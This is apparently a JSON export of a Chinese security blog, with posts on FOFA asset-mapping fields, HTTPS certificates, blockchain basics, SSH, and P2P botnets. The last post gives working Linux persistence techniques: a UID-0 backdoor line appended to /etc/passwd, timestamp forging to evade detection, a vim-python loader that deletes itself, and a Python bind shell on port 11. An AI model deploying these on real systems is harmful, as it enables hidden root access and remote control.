[{"categories":null,"contents":"","date":"2025-02-10T11:24:03+08:00","permalink":"https://wander1ng.com/post/windows-etw%E6%8A%80%E6%9C%AF/","section":"post","tags":["技术"],"title":"Windows ETW技术"},{"categories":null,"contents":"哪些字段可用于拓线 单一的字段有时不能完全代表网站的所有特征，通常我们需要组合字段形成FOFA语法，以下提供一些可以用于拓线的字段：\nfid（FOFA聚合多个关键特征形成的唯一标识符。通过FID，用户可以快速找到具有相似特征的网站资产‌）\njarm（JARM 是一个活动的传输层安全 (TLS)服务器指纹识别工具）\nheader_hash（FOFA的header_hash特征是指HTTP响应头信息的哈希值）\nbody_hash (HTML正文计算的hash值)\nbanner（协议banner信息）\ncert（证书）\nheader（HTTP头信息）\nserver（网站server）\nport（开放端口）\nicon_hash（标识设备的图标哈希值‌）\ncerts_issuer_org（证书颁发者组织）\ncerts_issuer_cn（证书颁发者通用名称）\ncerts_subject_org（证书持有者组织）\ncerts_subject_cn（ 证书持有者通用名称）\nlastupdatetime（FOFA最后更新时间）\ntls_ja3s（JA3S 用于 SSL/TLS 通信的服务器端，指纹是使用 ServerHello 数据包中的属性 SSL 版本、密码和 SSLExtension生成的）\ntls_version（TLS 协议版本）\n特征选取 特征的选取通常基于以下几个因素：\n唯一性：选择那些能够独特标识APT组织活动的特征，以减少误报和提高准确性。 稳定性：选择那些不易频繁变化的特征，如某些特定的技术栈或服务配置。 可探测性：选择那些可以通过网络扫描或情报收集轻易探测到的特征。 相关性：选择与APT组织行为模式紧密相关联的特征。 哪些特征可用于拓线我们已经知道了，那如何快速锁定APT组织相关资产呢，以下是一些可优先选取的特征及其理由：\n证书特征：首先优先选取证书特征，因为证书信息相对稳定，不易频繁变化，可以作为APT组织资产识别的重要特征。证书提供了关于服务器身份的详细信息，包括颁发者、有效期、公钥等。证书的某些属性，如颁发机构（Issuer）和主题（Subject）中的组织名称，可以作为识别APT组织资产的重要线索。 TLS指纹：其次，选取TLS指纹，如JARM或JA3S指纹。这些指纹基于TLS握手过程中的详细信息，可以唯一标识一个服务器的TLS配置。TLS指纹可以帮助识别即使在IP地址或域名变化的情况下，仍然保持相同TLS配置的APT资产。 HTTP响应头特征：HTTP响应头特征，如Server头、Content-Type、Content-Length等。这些特征可以提供关于服务器软件、页面内容和响应大小的信息。通过分析这些特征，可以识别出与APT组织相关的特定服务器配置或行为模式并且这些信息相对稳定，易于通过网络扫描探测到。 HTTP响应Banner特征：Banner特征，如HTTP响应中的服务版本信息，也可以作为识别APT资产的线索。这些信息可能在APT组织的攻击基础设施中保持一致，从而帮助识别相关的资产。 基于TLS指纹关联 JA3方法用于收集Client Hello数据包中以下字段的十进制字节值：版本、可接受的密码、扩展列表、椭圆曲线密码和椭圆曲线密码格式，有助于识别客户端。JA3/S方法用于 SSL/TLS 通信的服务器端，指纹是使用 ServerHello 数据包中的属性 SSL 版本、密码和 SSLExtension生成的。JA3、JA3/S主要基于流量，服务器面对不同客户端产生不同的JA3S指纹。\nJARM则是完全主动的扫描并生成指纹，服务器可以生产唯一的JARM指纹。是一个活动的传输层安全 (TLS)服务器指纹识别工具，可以快速验证组中的所有服务器是否具有相同的 TLS 配置。\n基于Header的指纹关联 HTTP header中包括以下几种信息：\n**Content-Type：**代表内容的媒体类型和编码格式。 **Content-Length：**表示传输的请求／响应的Body的长度。 **Server：**用于返回服务器相关的软件信息。 **header_hash：**将HTTP或HTTPS响应头信息去掉value值后生成一个hash值。 基于Banner的指纹关联 Banner信息，也称为服务标识或服务Banner，是在客户端与服务器建立连接时，服务器发送给客户端的初始信息。这些信息通常包含了服务器的名称、版本号、操作系统、支持的协议等。然而，由于Banner可以进行人为修改、伪装或模糊，这使得单纯基于Banner的字段信息进行资产探测与识别的准确率无法得到保证。\n","date":"2025-02-10T10:20:08+08:00","permalink":"https://wander1ng.com/post/fofa%E6%B5%8B%E7%BB%98%E8%A7%84%E5%88%99%E6%94%B6%E9%9B%86/","section":"post","tags":["技术"],"title":"Fofa测绘规则收集"},{"categories":null,"contents":"​\tHTTPS实际上是HTTP+SSL/TLS，此处HTTPS证书指的就是SSL/TLS证书（SSL是TLS的早先版本，下文统称SSL证书）。\n​\tSSL证书是托管在网站源服务器中的数据文件（就像建立这个博客网站，实现HTTPS需要将证书文件配置在相应的服务器目录）。SSL证书促成了SSL/TLS加密，它们含有网站的公钥和网站标识以及相关信息。\n​\tSSL证书在一个数据文件中包含以下信息：\n针对其颁发证书的域名 证书颁发给那一个人、组织或设备 证书颁发机构 证书颁发机构的数字签名 关联的子域 证书的颁发日期和到期日期 公钥 ​\t该证书托管在一个网站的源服务器上，并被发送到任何请求加载该网站的设备上。所以网络空间测绘能够使用证书作为规则之一。\n​\t**HTTPS如何帮助验证Web服务器身份？**私钥可以确认服务器的身份，当客户端与网站建立连接时，拥有与网站SSL证书中公钥匹配的私钥可以证明该服务器确实是该网站的合法主机，反之如果HTTP遭受某些类型的攻击，并没有检查私钥的行为，便可能访问到仿冒网站。\n​\t某些类型的攻击具体指的是：在途攻击(中间人攻击)，DNS劫持，BGP劫持，域欺骗。\n​\tBGP 劫持是指攻击者恶意重新路由互联网流量的情况。攻击者通过不实地宣布实际上没有拥有、控制或路由到的 IP 地址组（称为 IP 前缀）的所有权来实现此目的。BGP 劫持就好比有人改变一段高速公路上的所有标志，将汽车重新引导到错误的出口。\n​\t什么是BGP：BGP 是边界网关协议的缩写，是互联网的路由协议。换句话说，它提供方向，以便流量尽可能有效地从一个 IP 地址传播到另一个 IP 地址。IP 地址是给定网站的实际网址。当用户键入网站名称、而浏览器找到并加载该网站名称时，请求和响应会在用户的 IP 地址和网站的 IP 地址之间来回传递。DNS（域名系统）服务器提供 IP 地址，但是 BGP 提供到达该 IP 地址的最有效方法。大体而言，如果 DNS 是互联网的通讯簿，BGP 就是互联网的路线图。\n​\t什么是域欺骗：域欺骗最典型的例子就是钓鱼网站以及电子邮件欺骗，电子邮件欺骗是指攻击者使用带有合法网站域名的虚假电子邮件地址。由于域验证未内置在简单邮件传输协议（SMTP）（构建电子邮件的协议）中，因此导致了这种可能。最近开发的电子邮件安全协议，例如 DMARC 和 DKIM，可以提供更好的验证功能。\n​\t一次SSL连接中的证书校验过程\n​\t有效的证书需要由权威机构CA签名，CA会使用自己的私钥来生成数字签名。这个权威机构的CA客户端是完全可以信任的，客户端浏览器会安装CA的根证书，由CA签名的根证书是被CA所信任的，构成了信任链之后客户端可以信任该服务器的证书。\n客户端与服务器建立连接时，服务器将自身的证书传输给客户端。 客户端在验证证书的时候，先看CA的根证书是否在自己信任的根证书列表中。 再用CA的根证书提供的公钥来验证服务器证书中的数字签名。如果公钥可以解开签名，证明该证书确实被CA所信任。再看证书是否过期，访问的网站域名是否与证书绑定的域名一致，这些都通过说明证书可以信任。 接下来使用服务器证书里面的公钥进行服务器身份的验证。客户端生成一个随机数给到服务器，服务器对随机数用私钥进行签名，回传给客户端。客户端用服务器证书的公钥对随机数的签名进行验证，若验证通过，则说明对应服务器确实拥有对应服务器证书的私钥。 接下来客户端会生成会话密钥，使用服务器公钥加密。服务器用自己的私钥解密后，用会话密钥加密数据进行传输，建立SSL连接。 搭建博客时，供应商实际上能够确认你的域名所有权，有一条\u0026quot;CA机构-\u0026gt;域名供应商-\u0026gt;你\u0026quot;的信任链（即使你在A处买了域名，在B处买了服务器，最后免费证书也是A处生成的，再部署到B处服务器）。\n","date":"2025-01-07T17:11:13+08:00","permalink":"https://wander1ng.com/post/https%E8%AF%81%E4%B9%A6%E5%8E%9F%E7%90%86/","section":"post","tags":["技术"],"title":"HTTPS证书原理"},{"categories":null,"contents":"最近国内有做区块链的公司被朝鲜Lazarus打了，分析流量时遇到很多不懂的参数，顺势补一下课。虽然上车比较晚，但种一棵树最好的时候是十年前，其次是现在。去中心化金融，对于每个想要“玩自己的游戏的人”都是必修课。\n区块链のtutorial 区块链的本质，是一种特殊的分布式数据库。\n区块链的主要作用是存储信息，任何需要存储的信息都可以写入区块链也可以从里面读取，所以它是数据库。\n去中心化→任何人都可以架设服务器，加入区块链网络，作为一个节点。每个节点最后都会同步，保证区块链的一致，都保存着整个数据库。\n区块链的最大特点：彻底无中心。其他的数据库都有DBA，但是区块链从原理上防止了居于中心地位的管理当局（Cool）。\n区块链的可信原理：区块链由一个个区块即block组成，类似于数据库的记录。每次写入数据，将创建一个区块。每个区块包含两部分，区块头head和区块体body，分别记录当前区块的特征值和实际数据。**区块头包含了当前区块的多项特征值：生成时间，区块体的hash，上一个区块区块头的hash，等等。**SHA256是区块链的hash算法，由于区块头中包含上一个区块的hash，所以可以实现链式结构（想到单向链表）。如果当前区块的区块体改变，或者上一个区块的区块头改变，都会引起当前区块头hash的改变。每一个区块都连着上一个区块，所以称之为“区块链”。\n如果有人要修改一个区块，为了让后面的区块还能连到它（因为下一个区块包含上一个区块的哈希），必须依次修改后面所有的区块，否则被改掉的区块就脱离区块链了。由于后面要提到的原因，哈希的计算很耗时，短时间内修改多个区块几乎不可能发生，除非有人掌握了全网51%以上的计算能力。\n挖矿：因为必须保证节点间的同步，所以新区块的添加速度不能太快。否则时间都消耗在同步上，因为同步之后之前做的计算已经没有意义。故中本聪在设计上让添加新区块变得非常困难，平均10分钟全网才能生成一个新区块。这种产出速度不通过命令达成，而是海量计算，计算的过程即挖矿。\n学到此处的疑问：①是否对于同一时刻世界上所有的矿机而言，都在对同一区块进行计算？②比特币的经济价值从何而来？③谷歌的量子计算会不会对当前区块链的逻辑造成影响？(毕竟快到开始用“平行时空”来解释了)。④当前区块的有效hash指的是什么？⑤SHA256的计算怎么才能够变成海量？普通文件的hash不到一秒钟便能够算完。hash值不是确定的吗，为什么能够计算很多次？⑥当前五花八门的币种和区块链、比特币是什么关系？\n难度系数：④的答案，不是任何一个hash都可以被区块链接受，只有足够难（计算出来的hash值小于target值）的hash才会被区块链承认。由于目标值非常小，所以需要计算非常多的次数才能达到要求，所以速度会非常慢。\ntarget = targetmax / difficulty\n其中targetmax=0x00000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF,difficulty的值写在区块头中。\n⑤的答案，如果要对同一个区块反复计算哈希，就意味着，区块头必须不停地变化，否则不可能算出不一样的哈希。区块头里面所有的特征值都是固定的，为了让区块头产生变化，中本聪故意增加了一个随机项，叫做 Nonce。Nonce 是一个随机值，矿工的作用其实就是猜出 Nonce 的值，使得区块头的哈希可以小于目标值，从而能够写入区块链。Nonce 是非常难猜的，目前只能通过穷举法一个个试错。根据协议，Nonce 是一个32位的二进制值，即最大可以到21.47亿。⑥理论上一个新区块需要再生长出5个区块才能确认，所以一笔交易平均需要1个小时才能确认？\n也有可能出现算完了21.47亿次，发现不可能计算出满足条件hash的时候，协议允许矿工改变区块体重新进行计算。\n难度系数的动态调节：挖矿具有随机性，没有办法保证十分钟正好产出一个区块。为了将产出速率恒定在十分钟，中本聪设计了对于难度系数的动态调节机制。难度系数每两周即2016个区块调整一次（想起今年BTC产量将减半的新闻）。过去两周生成的区块链过快时，难度系数便会增加，反之减小。\n区块链的分叉：如果两人同时向区块链写入数据，应该采用哪一个区块？现在的规则是，新节点总是采用最长的那条区块链。如果存在分叉的情况，看哪个分叉的节点（包括自身）先达到6个新区块（称之为“六次确认“）。由于新区快的生成速度由计算能力决定，拥有大多数计算能力的那条分支，将会成为区块链。\n区块链的弊端：①数据写入区块链，最少需要等待10min，所有节点同步数据，需要更多时间。②矿工需要进行无数无意义的计算，非常消耗能源（在AI兴起，算力资源更加珍贵的现在尤甚）。所以区块链的适用场景：\n不存在所有成员都信任的管理当局\r写入的数据不要求实时使用\r挖矿的收益能弥补使用区块链的成本 所以⑥错误，如果不存在分支情况，只需要一个区块便能够确认。存在分支情况才需要1小时。\nBTCのtutorial **非对称加密：**基于公钥和私钥的加密算法。公钥是公开的，任何人都可以获取。私钥是保密的，只有拥有者才能使用。他人使用你的公钥加密信息发送给你，你可以使用私钥解密。你也可以使用私钥加密信息，别人使用你的公钥解开。\n比特币钱包：对于比特币来说，钱不是支付给个人的，而是支付给某笔私钥的，这就是交易匿名性的根本原因。所以比特币交易的第一件事，就是拥有自己的公钥和私钥。在交易所开户，首先会让你生成一个比特币钱包。这个钱包不用来存放比特币，而是用来存放公钥和私钥，\n公钥：即钱包地址，根据协议，公钥的长度是512位。这个长度不太方便传播，因此协议又规定，要为公钥生成一个160位的指纹。所谓指纹，就是一个比较短的、易于传播的哈希值。160位是二进制，写成十六进制，大约是26到35个字符，比如 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2。这个字符串就叫做钱包的地址，它是唯一的，即每个钱包的地址肯定都是不一样的。你向别人收钱时，只要告诉对方你的钱包地址即可，对方向这个地址付款。由于你是这个地址的拥有者，所以你会收到这笔钱。\n交易过程：一笔交易的过程就是一个地址的比特币，转移到另一个地址。由于比特币的交易记录是全部公开的，所以公钥拥有多少比特币是可以验证的。问题出现在如何证明申报一笔转出交易的人确实是转出方。故比特币协议规定，申报交易时除了交易金额，转出比特币的一方还必须提供①上一笔交易的hash②本次交易双方的地址。③支付方的公钥④支付方私钥生成的数字签名\n验证交易的过程：①找到上一笔交易，确定支付方比特币的来源。②计算出支付方公钥的指纹，确认与支付方的地址一致，从而保证公钥属实。③使用公钥解开数字签名，保证私钥属实。\n确认交易的真实性后，交易还需要写入数据库被公众承认才算真正完成，BTC使用的数据库即区块链。\n首先所有的交易数据都被传送的矿工，矿工负责将这些数据写进区块体中。根据BTC协议，一个区块的大小最大时1MB，一笔交易大概500byte，因此一个区块最多包含2000多笔交易。矿工负责将这些交易打包成一个区块，然后计算这个区块的hash。矿工间相互竞争，谁第一个将新区快写入区块链谁便获得全部收益。\n**比特币不存放在钱包里，只存放在区块链上。**实际上你每次使用比特币，都需要第一笔交易开始计算收入减去支出。\n矿工的收益，BTC协议规定挖到新区块的将会获得奖励，08年是50个比特币，每4年减半，流通中的新比特币是这样产生的。在挖矿奖励趋近于零之后，矿工的收益就完全依靠交易手续费了。\n所谓交易手续费，就是矿工可以从每笔交易抽成，具体的金额由支付方自愿决定。你完全可以一毛不拔，一分钱也不给矿工，但是那样的话，你的交易就会没人处理，迟迟无法写入区块链，得到确认。矿工们总是优先处理手续费最高的交易。\n区块的扩容：比特币网络每10分钟只能处理2000多笔交易，即全网3-5笔每秒，相比于传统支付来说非常慢。比特币扩容即将区块大小从1MB增加到更大，以提高单位时间内的处理交易数量。\n**点对点网络：**比特币是一个全世界的开放网络，只要你有服务器，就能加入这个网络，成为一个节点。每个节点都包含了整个区块链（目前大概 100多 GB），并且节点之间时刻不停地在同步信息。当你发生了一笔支付，你所在的节点就会把这笔交易告诉另一个节点，直至传遍整个网络。矿工从网上收集各种新发生的交易，将它们打包写入区块链。一旦写入成功， 矿工所在节点的区块链，就成为最新版本，其他节点都会来复制新增的区块，保证全网的区块链都是一致的。\n去中心化金融(DeFi) Decentralized Finance，俗称DeFi，是一种建立于区块链上的金融，不依赖于券商、交易所或银行等金融机构提供的金融工具，而是利用区块链上的智能合约(例如：以太坊)进行金融活动。DeFi平台允许人们向他人借出或借入资金，交易加密货币，并在类似储蓄的账户中获得利息。\n智能合约(Smart contract) 是一种智能协议，在区块链内制定合约时使用，当中内含了代码函数 (Function)，亦能与其他合约进行交互、做决策、存储资料及发送以太币等功能。智能合约主力提供验证及执行合约内所订立的条件。智能合约允许在没有第三方的情况下进行可信交易。这些交易可追踪且不可逆转。\n智能合约的目的是提供优于传统合同方法的安全，并减少与合同相关的其他交易成本。\n参考：阮一峰的技术博客\n","date":"2024-12-10T18:01:48+08:00","permalink":"https://wander1ng.com/post/blockchain%E6%9C%AF%E8%AF%AD/","section":"post","tags":["技术"],"title":"区块链\u0026BTCのtutorial"},{"categories":null,"contents":"SSH (Secure Shell) 和 SSHD (SSH Daemon) 是两个密切相关但不同的概念，在安全远程登录和管理方面扮演着不同的角色。以下是它们的详细区别：\n1. SSH（Secure Shell） SSH 是一个协议和客户端工具，用于在不安全的网络上安全地连接到远程计算机。\n协议层面： SSH 是一个网络协议，允许加密的网络服务，例如远程登录到计算机系统。它通过加密的方式提供安全的通信信道。 它主要用于取代传统的、缺乏安全性的远程登录协议如 Telnet 和 rlogin。 客户端工具： SSH 也指用于连接到远程服务器的客户端工具。在类 Unix 系统中，SSH 通常是通过命令行工具 ssh 来实现的。 用户可以通过命令行使用 ssh 命令来连接到远程服务器。例如ssh user@remote_host 常用功能包括： 远程命令执行 文件传输（通过 SCP 或 SFTP） 端口转发（本地、远程、动态） 2. SSHD（SSH Daemon） SSHD 是一个服务器守护进程，负责处理和管理来自 SSH 客户端的连接请求。\n守护进程： SSHD 是一个服务器进程，通常在后台运行，等待并处理来自 SSH 客户端的连接请求。 在类 Unix 系统中，SSHD 通常是通过守护进程 sshd 来实现的。 功能： 监听指定的端口（默认端口为 22），接受 SSH 客户端的连接请求。 进行身份验证（如密码、密钥、双因素等）。 建立加密的通信通道。 启动适当的会话（如命令行 shell 会话、文件传输会话）。 管理和监控活动会话。 配置文件： SSHD 的行为和配置可以通过配置文件 /etc/ssh/sshd_config 来管理。 典型的配置选项包括： 允许的身份验证方法 监听的端口 允许的用户和主机 登录选项（如根登录是否允许） 结论 SSH 是用于连接到远程服务器的协议和客户端工具，它允许用户通过加密的通道与远程计算机进行安全通信。 SSHD 是运行在服务器端的守护进程，它负责处理和管理来自 SSH 客户端的连接请求，并建立安全的会话。 它们共同工作，使得远程管理和通信变得安全且高效。通过 ssh 客户端，用户可以安全地连接到运行 sshd 的远程服务器，进行各种远程操作。\n","date":"2024-11-26T19:58:19+08:00","permalink":"https://wander1ng.com/post/ssh%E4%B8%8Esshd%E7%9A%84%E5%8C%BA%E5%88%AB/","section":"post","tags":["Linux"],"title":"SSH与SSHD的区别"},{"categories":null,"contents":"僵尸网络分类 僵尸网络按照命令与控制机制不同可以分成：IRC（Internet Reply Chat）协议僵尸网络、HTTP（Hypertext Transport Protocol）协议僵尸网络和P2P（Peer to Peer）协议僵尸网络。IRC协议僵尸网络和HTTP协议僵尸网络较为相似，同属C/S即Client/Server僵尸网络结构，均存在核心服务器，控制命令都要通过核心服务器进行发布，区别在于使用的协议不同。\nP2P协议僵尸网络具有节点对等特性，所有僵尸网络主机既是客户端也是服务器，有效克服了IRC和HTTP僵尸网络容易被检测发现以及过度依赖核心服务器的缺陷。\nP2P僵尸网络功能结构 主体功能模块包含**命令与控制模块、通讯模块和传播模块．**命令与控制模块负责解析邻居节点发送的控制指令并将 解析好的指令发送给相关模块执行；通讯模块负责与邻居节点的信息交互，包括接收邻居节点的控制指令并把该控制指令发送给其他邻居节点、与邻居节点交换邻居节点列表以及根据需要将执行结果返回给邻居节点．传播模块负责传播僵尸程序，不断扩大僵尸网络规模．\n辅助功能模块包含**僵尸主机控制模块、下载与更新模块和躲避检测与对抗模块．**僵尸主机控制模块负责完成实施命令与控制模块解析的控制者指令，如窃取信息、实施攻击等；下载与更新模块负责下载并更新僵尸程序，从而使得僵尸程序功能不断完善；躲避检测与对抗模块负责识别侦测环境并躲避侦测工具的检测与分析，从而提高僵尸网络的生存能力．\nP2P僵尸网络结构 可分为集中式P2P僵尸网络、非结构化P2P僵尸网络和结构化P2P僵尸网络\n集中式P2P僵尸网络由一个中央服务器以星状的形式与各僵尸主机连接，但这种连接不是物理上的星状拓扑，而是一个抽象虚拟的星状结构．在集中式P2P僵尸网络中，中央服务器负责存储、管理和组织僵尸主机信息，各个新感染的僵尸主机加入僵尸网络时要首先连接中央服务器并获得僵尸主机列表信息，新感染的僵尸主机通过与列表中的僵尸主机建立连接加入网络．\n集中式P2P僵尸网络结构的优点是维护简单，管理高效，控制者可以随时掌握僵尸网络所有僵尸主机信息，并能够高效地组织在线活动的僵尸主机进行各种攻击行为，控制指令从发出到执行的延迟较短．缺点是中央服务器的瘫痪将对整个僵尸网络影响较大，且易于被检测发现．典型的集中式P2P僵尸网络实例有Phatbot、SpamThru等．\n非结构化P2P僵尸网络无中央节点，僵尸主机之间均为对等连接．它没有固定、严格的拓扑结构，是一个随机生成、松散组织的普通图，不严格遵循某种形状，只是符合小世界模型或幂律模型，从本质上看也是僵尸主机自发形成的，\n非结构化P2P僵尸网络结构的优点是可以达到非常高的安全性、匿名性和稳定性，部分僵尸主机被发现或切断并不影响整个僵尸网络的运行，但其缺点是控制者不能完全掌握僵尸网络所有僵尸主机的信息，且路由效率不高，容易形成互相分离的僵尸子网，从而使得控制者指令不能到达所有在线活动僵尸主机，且从指令发出到僵尸主机执行存在较大延迟．典型的非结构化P2P僵尸网络实例有Sinit、Nugache等．\n结构化P2P僵尸网络与非结构化P2P僵尸网络一样，也不存在中央节点，所有僵尸主机既是服务器又是客户端，但结构化P2P僵尸网络有一个严格的覆盖网拓扑结构，如带弦环、多维空间、超立方体、蝴蝶形等．结构化P2P僵尸网络采用分布式散列表技术来组织网络中的僵尸主机，分布式散列表使用安全的一致性散列函数将各个僵尸主机映射到覆盖网中，其中最著名的就是SHA系列函数，它能产生均匀、随机、与输入无关的散列值，且冲突概率极小．\n结构化P2P僵尸网络结构的优点是不仅具有非常高的安全性、匿名性，而且路由效率较高，控制者虽然不能掌握所有僵尸主机的信息，但其指令可以通过若干跳到达所有在线活动的僵尸主机，且延迟时间较短．缺点是节点的频繁加入和退出容易造成网络波动，从而形成多个互相分离的僵尸子网，稳定性较差．典型的结构化P2P僵尸网络实例有PeacommMl等．\nP2P僵尸网络工作机制 可分为四个阶段：传播阶段、感染阶段、通讯阶段和攻击阶段。\n传播阶段 传播阶段是指P2P僵尸网络不断传播僵尸程序到新的主机，从而不断扩大僵尸网络规模的过程．P2P僵尸网络的传播方式主要分为主动传播和被动传播两种类型．主动传播主要通过攻击系统漏洞、扫描后门程序等方式进行．该方式一般借助于传统的蠕虫病毒自动进行传播，对于重要的网络节点，控制者也可以通过密码破译、缓冲区溢出等攻击方式进行手动攻击．被动传播主要通过发送病毒邮件、钓鱼网站脚本、即时通信软件及文件资源共享等方式进行．该方式主要利用网络用户的心理弱点和不良上网习惯，引诱用户进入预先设计好的圈套中，从而实现将僵尸程序植入用户主机的目的．\n感染阶段 感染阶段是指僵尸程序植入新感染节点后，新感染节点加入僵尸网络的过程．其基本过程如下： (1)新感染节点A发出加入网络请求指令；(2)收到请求指令的僵尸主机B将回复一个询问指令，以获取新感染节点的IP地址等相关信息；(3)新感染节点回复报文，报告自己的相关信息；(4)僵尸主机B将新感染节点A的相关信息进行记录，并将自己的僵尸网络邻居节点列表发送给新感染节点A；(5)新感染节点A或僵尸主机B向自己的邻居节点发出公告，以告知新感染节点A的加入．对于集中式P2P僵尸网络，过程(2)、(4)、(5)由中央服务器完成．对于结构化P2P僵尸网络，僵尸主机B在过程(4)中还要先协调僵尸网络中的僵尸主机为新感染节点A生成一个唯一D标识．\n通讯阶段 通讯阶段是指僵尸网络中的僵尸主机自发进行信息交互的过程．P2P僵尸主机为了保持与邻居节点的连接状态并获得僵尸网络最新消息，必须定期或不定期地与邻居节点进行信息交互，通过信息交互，P2P僵尸主机可以获得最新的邻居节点列表、最新的控制指令序列及最新的僵尸程序更新等．通讯机制的好坏决定了P2P僵尸网络的稳定性和适应性．当前P2P僵尸网络主要的通讯机制有：直接路由、路由指令、广播指令、路径返回和信息同步．\n(1)直接路由：当一个僵尸主机想要发送信息给目的主机时，该僵尸主机直接把报文目的地址填成目的主机的IP(Internet Protoc01)地址，并通过网络协议和路由设备将报文转发给目的主机．该方式是邻居节点之间信息交互的常用方式，也是其他通讯机制的基础．\n(2)路由指令：当一个僵尸主机想要通过僵尸网络发送一个指令到目的主机时，该僵尸主机不是直接发送该指令给目的主机，而是将指令封装在一个路由指令里，然后把路由指令随机发送给自己的邻居节点．路由指令的头部信息包括目的主机的P地址和最大跳数．当一个僵尸主机收到该路由指令时，首先检查目的主机碑地址是否与自己相同，如果相同则打开路由指令并解析其中包含的指令，如果不相同，则检查最大跳数是否为0，为0则丢弃该报文，否则将最大跳数减1，并随机发送给自己的邻居节点．该方法为控制者提供了有效的匿名性和安全性，因为目的主机收到路由指令报文不能确定发送主机的m地址，而且每次的路由路径是随机不定的，任何单一的僵尸网络检测终端都无法获得全部的报文信息．\n(3)广播指令：当一个新感染节点加入僵尸网络时，僵尸主机一般会采用广播的方式来告知新节点的加入，这种方式使得僵尸主机的邻居节点列表保持同步．僵尸主机一般会通过把路由指令中的m地址设为0来表示该指令为广播指令，每个广播命令都有固定的编号，当一个僵尸主机收到未见过的广播指令时，它将会解析指令并执行，并将该指令广播给自己的其他邻居节点．\n(4)路径返回：当一个僵尸主机执行完一个路由指令或者广播指令后，如果需要返回相关执行结果给指令发送者，就需要采用路径返回通讯机制，因为指令执行者不知道指令发送者的P地址．该机制的基本原理就是按照指令的传送路径将回馈信息返回给指令发送者．\n(5)信息同步：每个僵尸主机都会维护一张邻居节点列表，每过一段时间，僵尸主机都会与全部或部分邻居节点进行联系，以实现与邻居节点的信息同步．其中主要包括交换邻居节点信息、更新僵尸程序等．\n攻击阶段 攻击阶段是指僵尸主机收到控制者指令并按照指令实施攻击的过程．僵尸主机接收指令的方式分为pull方式和push方式．pull方式是指僵尸主机定期从指定地方获取指令，该方式多见于集中式P2P僵尸网络；push方式是指僵尸主机从邻居节点那里接收指令并将指令转发给自己其他邻居节点的方式，该方式在P2P僵尸网络中应用较为广泛．\nP2P僵尸网络的检测方法 基于僵尸网络流量和行为特征的检测方法 基于僵尸网络流量特征的检测方法以文献[8-10]为代表，其基本思想是通过分析P2P僵尸网络在各个生命周期产生的特殊网络数据，找出P2P僵尸网络的流量和行为特征并生成特征向量，然后用决策树等机器学习的方法对P2P僵尸网络进行检测．特征有ICMP(Intemet Control Message Protoc01)报文异常突然增加、ARP(Address Reso-lution Protoc01)报文突然增多、SMTP(Simple Mail TransferProtoc01)报文突然增加、特定时间段内数据包相似、内网主机与外网主机连接相似等．文献[9]分析的特征有使用开放的连接端口且端口可能明确为某个区间、使用一个稳定的邻居节点列表等．文献[10]以Peacomm僵尸网络为例，通过分析协议流量、DNS(Domain Name System)查询邮件的交换记录及SMTP连接等信息，提出了能够检测非集中式P2P僵尸网络的相关特性．虽然这些方法能够针对检测P2P僵尸网络有一定效果，但是这些方法并不具有通用性，且许多正常的P2P应用也具备这些方法所提出的区分特征，容易产生误报．\n基于行为和聚类的检测方法 僵尸网络的本质特性是僵尸程序与控制者通过命令与控制信道进行通信并执行控制者指令实施恶意行为，由于僵尸程序的指令行为是程序预先设置好的，所以僵尸程序所实施的恶意行为是相似或相关的．\n文献[12]所提出的检测框架正是利用这一特性，对相似的通信和恶意行为产生的网络流量进行聚类，并使用交叉关联的方法识别出具有相似通信和恶意行为模式的僵尸主机，它不需要解析僵尸网络命令与控制协议、不需要捕获僵尸程序代码和僵尸网络特征码．\n参考：《P2P僵尸网络研究》Journal of Chinese Computer Systems 2012年10月 第10期\n","date":"2024-11-26T16:37:51+08:00","permalink":"https://wander1ng.com/post/irc-http-p2p%E4%B8%89%E7%A7%8D%E7%B1%BB%E5%9E%8B%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0/","section":"post","tags":["Botnet"],"title":"IRC/HTTP/P2P三种类型僵尸网络学习"},{"categories":null,"contents":"今天遇到一个清华的现场，从C2取回样本来发现是Linux挖矿的，VT检出是Xhide，由此延伸记录一下。\n添加Root权限后门用户 /etc/passwd这个文件包含了系统所有的用户名、ID、登录的shell等信息,这个文件是以分号分隔开的，依次是登录名、密码、用户ID、组ID，用户名、用户的根目录以及登录的shell，其中密码处可以是x(代表加密，存放在/etc/shadow文件中)，也可以直接是加密后的密文，此外用户uid为0代表用户会是root的权限，这个时候我们的目标就是在这个文件中追加一条，一个带有密文且id为0的账号。\n关于密码加密我们可以使用下面的命令\n#密码M0rk\rxxx@ubuntu:~/Desktop$ perl -e \u0026#39;print crypt(\u0026#34;M0rk\u0026#34;, \u0026#34;AA\u0026#34;). \u0026#34;\\n\u0026#34;\u0026#39;\rAAhmo1jgYI0HE 所以我们最终想要在passwd文件中的条目是这个样子的\nbackdoor:AAhmo1jgYI0HE:0:0:me:/root:/bin/bash append the backdoor to passwd file\necho \u0026#34;backdoor:AAhmo1jgYI0HE:0:0:me:/root:/bin/bash\u0026#34;\u0026gt;\u0026gt;/etc/passwd 注意当我们拥有一个命令执行漏洞或写文件漏洞且为root权限，这个时候就可以通过这种方法直接添加用户。且sshd需要允许root用户远程登录，PermitRootLogin yes\n另外需要注意的是修改完文件之后记得修改一下文件的时间戳，防止被发现，可以使用touch命令进行伪造。\n优点：简单，缺点：易被检测到，排查：检查/etc/passwd文件是否有异常。\nvim后门 #enter the mal script directory 、execute the script and then remove the script\rcd /usr/lib/python2.7/site-packages \u0026amp;\u0026amp; $(nohup vim -E -c \u0026#34;pyfile dir.py\u0026#34;\u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp;) \u0026amp;\u0026amp; sleep 2 \u0026amp;\u0026amp; rm -f dir.py 此方法适用于安装了vim且安装了python扩展(绝大版本默认安装)的linux系统,至于恶意脚本dir.py的内容可以是任何功能的后门。如python版本的正向后门监听11端口。\n#from https://www.leavesongs.com/PYTHON/python-shell-backdoor.html\rfrom socket import *\rimport subprocess\rimport os, threading, sys, time\rif __name__ == \u0026#34;__main__\u0026#34;:\rserver=socket(AF_INET,SOCK_STREAM)\rserver.bind((\u0026#39;0.0.0.0\u0026#39;,11))\rserver.listen(5)\rprint \u0026#39;waiting for connect\u0026#39;\rtalk, addr = server.accept()\rprint \u0026#39;connect from\u0026#39;,addr\rproc = subprocess.Popen([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;], stdin=talk,\rstdout=talk, stderr=talk, shell=True) 